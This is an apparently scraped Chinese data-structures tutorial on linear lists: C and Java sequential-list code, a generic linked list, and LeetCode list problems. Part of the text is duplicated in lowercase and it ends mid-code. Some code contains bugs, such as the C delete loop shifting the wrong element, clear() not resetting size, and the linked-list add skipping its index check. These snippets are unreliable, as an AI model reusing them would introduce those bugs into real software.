}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n\n\n添加范型的Java实现方式：\n\npackage com.pwddd.list;\n\n\npublic class ArrayList<E> {\n\n  private static final int ELEMENT_NOT_FOUND = -1;\n  private E[] elems;\n  private int size;\n  private static final int DEFAULT_CAPACITY = 10;\n\n  /**\n     * 指定大小进行初始化\n     *\n     * @param capacity 自定义大小\n     */\n  public ArrayList(int capacity) {\n    capacity = capacity > DEFAULT_CAPACITY ? capacity : DEFAULT_CAPACITY;\n    elems = (E[]) new Object[capacity];\n  }\n\n\n  /**\n     * 默认初始化\n     */\n  public ArrayList() {\n    this(DEFAULT_CAPACITY);\n  }\n\n  /**\n     * 清除所有元素\n     */\n  public void clear() {\n    // 对于int类型而言，只需要让size=0 无法访问即可\n    // 如果是对象类型则为了让垃圾收集器工作，则需要设置为null\n    //        size = 0;\n    for (int i = 0; i < size; i++){\n      elems[i] = null;\n    }\n  }\n\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  public boolean isEmpty() {\n    return size == 0;\n  }\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  public boolean contains(E element) {\n    return indexOf(element) != ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  public void add(E element) {\n    add(size,element);\n  }\n\n  /**\n     * 获取index位置的元素\n     *\n     * @param index  指定的索引位置\n     * @return 索引位置的元素\n     */\n  public E get(int index) {\n    checkIndex(index);\n    return elems[index];\n  }\n\n  /**\n     * 设置index位置的元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     * @return 原来的元素ֵ\n     */\n  public E set(int index, E element) {\n    checkIndex(index);\n    E oldElem = elems[index];\n    elems[index] = element;\n    return oldElem;\n  }\n\n  /**\n     * 在index位置插入一个元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     */\n  public void add(int index, E element) {\n    checkIndexForAdd(index);\n    ensureCapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * 删除index位置的元素\n     *\n     * @param index 指定索引位置\n     * @return 删除位置之前的元素\n     */\n  public E remove(int index) {\n    checkIndex(index);\n    E oldElem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    elems[--size] = null;\n    return oldElem;\n  }\n\n  /**\n     * 查看元素的索引\n     *\n     * @param element 指定查找的元素\n     * @return 元素的索引\n     */\n  public int indexOf(E element) {\n    if (element == null) return -1;\n    for (int i = 0; i < size ; i++){\n      if (element.equals(elems[i])){\n        return i;\n      }\n    }\n    return ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * 保证要有capacity的容量\n     *\n     * @param capacity 当前容量\n     */\n  private void ensureCapacity(int capacity) {\n    int oldCapacity = elems.length;\n    if (oldCapacity >= capacity) return;\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    E[] newElems = (E[]) new Object[newCapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newElems[i] = elems[i];\n    }\n    elems = newElems;\n  }\n\n  private void checkIndex(int index){\n    if (index < 0 || index >= size){\n      throw new IndexOutOfBoundsException("元素索引越界--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n  private void checkIndexForAdd(int index){\n    if (index < 0 || index > size){\n      throw new IndexOutOfBoundsException("元素索引越界--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n\n\n\n# 线性表的链式表示和实现（Java语言版）\n\n\n# 单链表的定义和表示\n\n> 线性表的链式存储结构的特点是：使用一组人意的存储单元存储线性表中的数据元素，可以是连续的，也可以是不连续的。\n\n为了表示每个元素和其后继元素之间的关系，除了存储数据本身的信息之外，还需要一个存储后继元素位置的区域。我们通常讲：数据域和指针域。指针域中存储的信息为指针或者链。n个链结合成一个链表称为线性表。(a1,a2,……an)\n\n**根据链表的指针的个数、方向、连接方式等，链表又可以分为：单链表、循环链表、双向链表、二叉链表、十字链表、邻接表、邻接多重表等。**单链表、循环链表和双向链表用于实现线性表的链式存储结构。其他形式多用于实现树或者图等非线性的结构。\n\n在Java中，单链表的存储结构可以定义为：\n\ntypedef int ElemType;\n\ntypedef struct {\n  ElemType data;\n  struct LNode *next;\n}LNode, *LinkList;\n\n\n1\n2\n3\n4\n5\n6\n\n\n一般情况下，往往在单链表的第一个节点之前设置一个节点，称为头节点。这里我们先不要添加头结点。\n\n * 头节点是在首元结点之前附设的一个结点，指针域指向首元素结点。\n * 头指针是指向链表中第一个结点的指针，若链表设置有头结点，则头指针指向头结点。\n\n给链表增加头结点的好处：\n\n * 便于首元节点的处理。\n * 便于空表和非空表的统一处理。\n\n\n# 单链表的基本操作的实现\n\n和顺序表统一接口：\n\npackage com.pwddd;\n\npublic interface List<E> {\n\n  public static final int ELEMENT_NOT_FOUND = -1;\n\n  /**\n     * 清除所有元素\n     */\n  void clear();\n\n\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  int size();\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  boolean isEmpty();\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  boolean contains(E element);\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  void add(E element);\n\n  /**\n     * 获取index位置的元素\n     *\n     * @param index 指定的索引位置\n     * @return 索引位置的元素\n     */\n  E get(int index);\n\n  /**\n     * 设置index位置的元素\n     *\n     * @param index   指定的索引位置\n     * @param element 索引位置原来的元素\n     * @return 原来的元素ֵ\n     */\n  E set(int index, E element);\n\n  /**\n     * 在index位置插入一个元素\n     *\n     * @param index   指定的索引位置\n     * @param element 索引位置原来的元素\n     */\n  void add(int index, E element);\n\n\n  /**\n     * 删除index位置的元素\n     *\n     * @param index 指定索引位置\n     * @return 删除位置之前的元素\n     */\n  E remove(int index);\n\n  /**\n     * 查看元素的索引\n     *\n     * @param element 指定查找的元素\n     * @return 元素的索引\n     */\n  int indexOf(E element);\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\n定义抽象类，将顺序表和链表公共部分抽取出来：\n\npackage com.pwddd;\n\npublic abstract class AbstractList<E> implements List<E> {\n  protected int size;\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  public boolean isEmpty() {\n    return size == 0;\n  }\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  public boolean contains(E element) {\n    return indexOf(element) != ELEMENT_NOT_FOUND;\n  }\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  public void add(E element) {\n    add(size,element);\n  }\n\n  protected void checkIndex(int index){\n    if (index < 0 || index >= size){\n      throw new IndexOutOfBoundsException("元素索引越界--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n\n  protected void checkIndexForAdd(int index){\n    if (index < 0 || index > size){\n      throw new IndexOutOfBoundsException("元素索引越界--"+"[Index]:"+index+", [Size]:"+size);\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n单链表的实现：\n\npackage com.pwddd.linkedlist;\n\nimport com.pwddd.AbstractList;\n\npublic class LinkedList<E> extends AbstractList<E> {\n\n  private Node<E> first;\n\n  @Override\n  public void clear() {\n    size = 0;\n    first = null;\n  }\n\n  @Override\n  public E get(int index) {\n    return node(index).element;\n  }\n\n  @Override\n  public E set(int index, E element) {\n    Node<E> node = node(index);\n    E old = node.element;\n    node.element = element;\n    return old;\n  }\n\n  @Override\n  public void add(int index, E element) {\n    if (index == 0){\n      first = new Node<E>(element,first);\n    }else {\n      Node<E> preNode = node(index - 1);\n      preNode.next = new Node<>(element,preNode.next);\n    }\n    size ++;\n  }\n\n  @Override\n  public E remove(int index) {\n    checkIndex(index);\n    Node<E> node = first;\n    if (index == 0){\n      first = first.next;\n    }else {\n      Node<E> prev = node(index - 1);\n      node = prev.next;\n      prev.next = node.next;\n    }\n    size--;\n    return node.element;\n  }\n\n  @Override\n  public int indexOf(E element) {\n    if (element == null){\n      Node<E> node = first;\n      for (int i = 0; i < size; i++) {\n        if (node.element == null) return i;\n        node = node.next;\n      }\n    }else {\n      Node<E> node = first;\n      for (int i = 0; i < size; i++) {\n        if (element.equals(node.element)){\n          return i;\n        }\n        node = node.next;\n      }\n    }\n    return ELEMENT_NOT_FOUND;\n  }\n\n\n  private Node<E> node(int index){\n    checkIndex(index);\n    Node<E> node = first;\n    for (int i = 0; i < index; i++) {\n      node = node.next;\n    }\n    return node;\n  }\n\n\n  private static class Node<E> {\n    E element;\n    Node<E> next;\n\n    public Node(E element, Node<E> next) {\n      this.element = element;\n      this.next = next;\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n\n# LeetCode-反转链表\n\n给你单链表的头节点 head ，请你反转链表，并返回反转后的链表。\n\n示例 1：\n\n\n\n输入：head = [1,2,3,4,5]\n输出：[5,4,3,2,1]\n\n\n1\n2\n\n\n示例 2：\n\n\n\n输入：head = [1,2]\n输出：[2,1]\n\n\n1\n2\n\n\n示例 3：\n\n输入：head = []\n输出：[]\n\n\n1\n2\n\n\n提示：\n\n * 链表中节点的数目范围是 [0, 5000]\n * -5000 <= Node.val <= 5000链表\n\n# 递归方式\n\n思路：\n\n边界条件：当传入的head为空，说明传入的是一个空表，或者传入的head的下一个结点为空，说明传入的是一个单结点。以上两种情况直接返回，没有必要反转。\n\n递归的想法就是调用自己完成反转，假设我们这个方法reverseList能够实现反转了，那么当我们传入一个链表的head的时候，就可以将该链表反转，那么当我们传入head的下一个的时候，意味着从head的下一个结点开始，已经完成了反转了。如图所示：\n\n\n\n我们只需要将头结点的下一个结点的下一个结点指向头结点，并且将头结点的下一个结点指向空即可。\n\npublic ListNode reverseList(ListNode head) {\n  if (head == null || head.next == null) return head;\n  ListNode newHead = reverseList(head.next);\n  head.next.next = head;\n  head.next = null;\n  return newHead;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 迭代方式\n\n迭代方式就相对来讲简单一些，使用双指针的办法。如下代码所示：\n\nclass Solution {\n  public ListNode reverseList(ListNode head) {\n    if (head == null || head.next == null) return head;\n    ListNode newHead = null;\n    while (head!= null){\n      ListNode tmp = head.next;\n      head.next = newHead;\n      newHead = head;\n      head = tmp;\n    }\n    return newHead;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n首先定义一个临时指针，指向head的下一个结点，防止head的下一个结点重新赋值后丢失。然后将head的下一个结点指向newHead，将newHead指向head，然后将head指向tmp。如图所示：\n\n\n\n\n# LeetCode - 判断链表是否有环\n\n给你一个链表的头节点 head ，判断链表中是否有环。\n\n如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。注意：pos 不作为参数进行传递 。仅仅是为了标识链表的实际情况。\n\n如果链表中存在环 ，则返回 true 。 否则，返回 false 。\n\n示例 1：\n\n\n\n输入：head = [3,2,0,-4], pos = 1\n输出：true\n解释：链表中有一个环，其尾部连接到第二个节点。\n\n\n1\n2\n3\n\n\n示例 2：\n\n\n\n输入：head = [1,2], pos = 0\n输出：true\n解释：链表中有一个环，其尾部连接到第一个节点。\n\n\n1\n2\n3\n\n\n示例 3：\n\n\n\n输入：head = [1], pos = -1\n输出：false\n解释：链表中没有环。\n\n\n1\n2\n3\n\n\n提示：\n\n * 链表中节点的数目范围是 [0, 104]\n * -105 <= Node.val <= 105\n * pos 为 -1 或者链表中的一个 有效索引 。\n\n可以使用快慢指针的方式，就像在操场跑步，快的一定会和慢的有重叠，没有重叠就说明不是环形的。\n\npublic boolean hasCycle(ListNode head) {\n  if (head == null || head.next == null) return false;\n  ListNode fast = head.next;\n  ListNode slow = head;\n  while (fast != null && fast.next != null){\n    if (fast ==slow ){\n      return true;\n    }\n    fast = fast.next.next;\n    slow = slow.next;\n  }\n  return false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# LeetCode-移除链表的元素\n\n给你一个链表的头节点 head 和一个整数 val ，请你删除链表中所有满足 Node.val == val 的节点，并返回 新的头节点 。\n\n示例 1：\n\n\n\n输入：head = [1,2,6,3,4,5,6], val = 6\n输出：[1,2,3,4,5]\n\n\n1\n2\n\n\n示例 2：\n\n输入：head = [], val = 1\n输出：[]\n\n\n1\n2\n\n\n示例 3：\n\n输入：head = [7,7,7,7], val = 7\n输出：[]\n\n\n1\n2\n\n\n提示：\n\n * 列表中的节点数目在范围 [0, 104] 内\n * 1 <= Node.val <= 50\n * 0 <= val <= 50\n\n# 递归\n\n\n\npublic ListNode removeElements(ListNode head, int val) {\n  if (head == null) return head;\n\n  head.next = removeElements(head.next, val);\n\n  return head.val == val ? head.next : head;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 迭代\n\n使用双指针的方式进行操作。\n\n\n\npublic ListNode removeElements(ListNode head, int val) {\n  if (head == null) return head;\n  ListNode node = new ListNode(1);\n  node.next = head;\n  ListNode tmp = node;\n  while (tmp.next != null){\n    if (tmp.next.val == val){\n      tmp.next = tmp.next.next;\n    }else {\n      tmp = tmp.next;\n    }\n  }\n  return node.next;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',normalizedContent:'# 线性表\n\n> 线性表和栈、队列、串以及数组都属于线性结构。线性结构基本特点是除了第一个元素无直接前驱、最后一个元素无直接后继，其他数据元素都有一个前驱和后继。\n\n\n# 定义和特点\n\n生活中有很多线性表的例子，比如26个英文字母、学生信息表等等。他们的数据元素虽然不相同，但是同一个线性表中的元素必定有相同的特性。\n\n诸如此类由n(n>=0)个数据特性相同的元素构成的有限序列称为线性表。线性表中的n称为线性表的长度，n=0时则为空表。\n\n非空线性表通常有如下的特征：\n\n * 存在为一个被称为 第一个的数据元素\n * 存在唯一一个被称为 最后一个的数据元素\n * 除了第一个之外，每个元素都有且只有一个前驱\n * 除了最后一个之外，每个元素都有且只有一个后继\n\n\n# 线性表的类型定义\n\n线性表是一个十分灵活的数据结构，长度可根据需求增加或缩短，还可以对线性表的元素进行访问、删除、插入等操作。以下给出线性表的抽闲数据类型定义：\n\n\n\n\n# 线性表的顺序表示和实现（c语言版）\n\n\n# 线性表的顺序存储表示\n\n> 线性表的顺序表示指的是使用 一组连续地址的存储单元存储线性表的元素，这个表示也称为顺序存储结构或者顺序映像。通常这种存储结构的线性表称为 顺序表。逻辑上相邻的元素在物理次序上也是相邻的\n\n假设一个元素占用l个存储空间，并且占用的第一个存储地址作为元素存储的起始位置。则线性表中第i+1个元素的存储位置和第i个元素的存储位置之间的关系如下：\n\nloc(ai+1) = loc(ai) + l\n\n\n1\n\n * 线性表的第一个元素的起始位置loc(a1)，通常称为线性表的起始位置或者基地址。\n * 每个元素的存储位置和元素在线性表中的位序成正比\n * 只要确定起始位置和元素大小，任意元素的位置都可随机存取\n * 因此线性表的顺序存储结构是一种 随机存取的存储结构。\n\n\n\n在高级程序设计语言中的数组有着类似的随机存取特性，因此通常使用数据描述数据结构中的顺序存储结构。c语言中的线性表可描述如下：\n\n#define maxsize 100\ntypedef struct{\n  elemtype * elem;\n  int length;\n}sqlist;\n\n\n1\n2\n3\n4\n5\n\n * 数组空间大小为maxsize通过初始化动态分配得到，初始化之后elem指针指向顺序表的基地址。\n * 元素类型elemtype可以根据实际类型进行定义。可以为int 、float登记本数据类型或者strut的结构体类型。\n * length表示顺序表中存在的元素个数。\n\n\n# 顺序表的基本操作\n\n# 0. 初始化\n\n> 顺序表的初始化操作是构造一个空的顺序表。\n\nvoid initlist(sqlist *list){\n  // 分配空间\n  list->elem = (elemtype *)malloc((size_t)(sizeof(elemtype) * default_capacity));\n  if (list->elem == null){\n    printf("%s\\n",strerror(errno));\n    exit(-1);\n  }\n\n  // 初始化参数\n  list->size = 0;\n  list->capacity = default_capacity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. 顺序表扩容\n\n> 当顺序表存储空间不足时，需要对顺序表进行扩容，这里定为扩容两倍大小。\n\nvoid seqlistexpand(sqlist *list){\n  list->elem = (elemtype *)realloc(list->elem,2 * list->capacity * sizeof(elemtype));\n  if (list->elem == null){\n    error();\n  }\n  list->capacity = 2 * list->capacity;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 2. 取值\n\n> 取值操作是根据指定元素的位置序号i，获取顺序表中的第i个元素的值。\n\nelemtype getitem(sqlist *list,int index){\n  if (index < 0 || index >= list->size){\n    // 长度异常报错\n    printf("%s\\n", strerror(errno));\n    exit(-2);\n  }\n  return list->elem[index];\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. 查找\n\n> 查找元素是根据指定元素值e，查找顺序表中与给定e相等的元素的第一个位置，成功则返回位置序号，失败则返回-1。\n\nint locateelem(sqlist *list,elemtype elemtype){\n  for (int i = 0; i < list->size; i++) {\n    if (elemtype == list->elem[i]){\n      return i;\n    }\n  }\n  return -1;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n当在顺序表中查找一个元素时，需要从头开始遍历顺序表，比较的次数则取决为元素在线性表中的位置。\n\n在查找时，为了确定元素在顺序表中的位置，需要和给定的值进行比较的数据元素个数的期望值称为查找算法阿兹查找成功时的平均查找长度（asl）。\n\n假设pi是查找第i个元素的概率，ci为找到表中其关键字与给定的相等的第i个记录时，和给定值已经比较过的关键字个数，则在长度为n的线性表中，查找成功时平均查找长度为：\n\n\n\n从查找的算法过程可知，当查找的元素是第一个记录时，只需要比较一次；当查找的元素为最后一个记录时，则需要比较n次。假设每个元素的查找概率相等，即pi = 1/n，则可以化简为：\n\n\n\n得出顺序表的值查找平均时间复杂度为o(n)\n\n# 4. 插入\n\n> 线性表的插入操作时在表的指定i位置插入一个新的元素e，并将长度为n的线性表变为n+1。\n\nelemtype listinsert(sqlist *list, int index, elemtype elem){\n  // 判断索引是否正确\n  if (index < 0 || index > list->size){\n    error();\n  }\n\n  // 判断容量是否充足\n  if (list->size == list->capacity){\n    seqlistexpand(list);\n  }\n  //插入元素\n  // 末尾插入\n  if(index == list->size){\n    list->elem[index] = elem;\n    list-> size ++;\n    return null;\n  }else{\n    for (int i = list->size ; i > index ; i--) {\n      list->elem[i] = list->elem[i - 1];\n    }\n    elemtype oldelem = list->elem[index];\n    list->elem[index] = elem;\n    list->size ++;\n    return oldelem;\n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n根据分析，算法插入时的平均时间复杂度为o(n)。\n\n# 5. 删除指定位置的元素\n\n> 删除元素是指将指定索引位置的元素删除，并将该位置原本的元素返回。\n\nelemtype listdelete(sqlist *list,int index){\n  if (index < 0 || index >= list->size){\n    error();\n  }\n  // 删除最后一个元素\n  if (index == list->size - 1){\n    elemtype oldelem = list->elem[index];\n    list->elem[index] = null;\n    list->size --;\n    return oldelem;\n  } else{\n    elemtype oldelem = list->elem[index];\n    for (int i = index; i < list->size - 1; ++i) {\n      list->elem[i] = list->elem[index + 1];\n    }\n    list->size --;\n    return oldelem;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n顺序表的删除算法平均时间复杂度为:o(n)。\n\n以上就是c语言实现的顺序表的关键操作，下面使用java版本的实现。\n\n\n# 线性表的顺序表示和实现（java语言版）\n\n> java语言版的顺序表相对于c语言版的忽略了底层的一些操作。写法更为简单，同时java语言的arraylist实际上就是对顺序表的实现。\n\n以下是java版本的全部代码(不使用范型)：\n\npackage com.pwddd.list;\n\npublic class arraylist {\n\n  private static final int element_not_found = -1;\n  private int[] elems;\n  private int size;\n  private static final int default_capacity = 10;\n\n  /**\n     * 指定大小进行初始化\n     *\n     * @param capacity 自定义大小\n     */\n  public arraylist(int capacity) {\n    capacity = capacity > default_capacity ? capacity : default_capacity;\n    elems = new int[capacity];\n  }\n\n\n  /**\n     * 默认初始化\n     */\n  public arraylist() {\n    this(default_capacity);\n  }\n\n  /**\n     * 清除所有元素\n     */\n  public void clear() {\n    // 对于int类型而言，只需要让size=0 无法访问即可\n    // 如果是对象类型则为了让垃圾收集器工作，则需要设置为null\n    size = 0;\n  }\n\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  public boolean isempty() {\n    return size == 0;\n  }\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  public boolean contains(int element) {\n    return indexof(element) != element_not_found;\n  }\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  public void add(int element) {\n    add(size,element);\n  }\n\n  /**\n     * 获取index位置的元素\n     *\n     * @param index  指定的索引位置\n     * @return 索引位置的元素\n     */\n  public int get(int index) {\n    checkindex(index);\n    return elems[index];\n  }\n\n  /**\n     * 设置index位置的元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     * @return 原来的元素ֵ\n     */\n  public int set(int index, int element) {\n    checkindex(index);\n    int oldelem = elems[index];\n    elems[index] = element;\n    return oldelem;\n  }\n\n  /**\n     * 在index位置插入一个元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     */\n  public void add(int index, int element) {\n    checkindexforadd(index);\n    ensurecapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * 删除index位置的元素\n     *\n     * @param index 指定索引位置\n     * @return 删除位置之前的元素\n     */\n  public int remove(int index) {\n    checkindex(index);\n    int oldelem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    size --;\n    return oldelem;\n  }\n\n  /**\n     * 查看元素的索引\n     *\n     * @param element 指定查找的元素\n     * @return 元素的索引\n     */\n  public int indexof(int element) {\n    for (int i = 0; i < size ; i++){\n      if (elems[i] == element){\n        return i;\n      }\n    }\n    return element_not_found;\n  }\n\n  /**\n     * 保证要有capacity的容量\n     *\n     * @param capacity 当前容量\n     */\n  private void ensurecapacity(int capacity) {\n    int oldcapacity = elems.length;\n    if (oldcapacity >= capacity) return;\n    int newcapacity = oldcapacity + (oldcapacity >> 1);\n    int[] newelems = new int[newcapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newelems[i] = elems[i];\n    }\n    elems = newelems;\n  }\n\n  private void checkindex(int index){\n    if (index < 0 || index >= size){\n      throw new indexoutofboundsexception("元素索引越界--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n  private void checkindexforadd(int index){\n    if (index < 0 || index > size){\n      throw new indexoutofboundsexception("元素索引越界--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n\n\n添加范型的java实现方式：\n\npackage com.pwddd.list;\n\n\npublic class arraylist<e> {\n\n  private static final int element_not_found = -1;\n  private e[] elems;\n  private int size;\n  private static final int default_capacity = 10;\n\n  /**\n     * 指定大小进行初始化\n     *\n     * @param capacity 自定义大小\n     */\n  public arraylist(int capacity) {\n    capacity = capacity > default_capacity ? capacity : default_capacity;\n    elems = (e[]) new object[capacity];\n  }\n\n\n  /**\n     * 默认初始化\n     */\n  public arraylist() {\n    this(default_capacity);\n  }\n\n  /**\n     * 清除所有元素\n     */\n  public void clear() {\n    // 对于int类型而言，只需要让size=0 无法访问即可\n    // 如果是对象类型则为了让垃圾收集器工作，则需要设置为null\n    //        size = 0;\n    for (int i = 0; i < size; i++){\n      elems[i] = null;\n    }\n  }\n\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  public boolean isempty() {\n    return size == 0;\n  }\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  public boolean contains(e element) {\n    return indexof(element) != element_not_found;\n  }\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  public void add(e element) {\n    add(size,element);\n  }\n\n  /**\n     * 获取index位置的元素\n     *\n     * @param index  指定的索引位置\n     * @return 索引位置的元素\n     */\n  public e get(int index) {\n    checkindex(index);\n    return elems[index];\n  }\n\n  /**\n     * 设置index位置的元素\n     *\n     * @param index 指定的索引位置\n     * @param element 索引位置原来的元素\n     * @return 原来的元素ֵ\n     */\n  public e set(int index, e element) {\n    checkindex(index);\n    e oldelem = elems[index];\n    elems[index] = element;\n    return oldelem;\n  }\n\n  /**\n     * 在index位置插入一个元素\n     *\n     * @param index 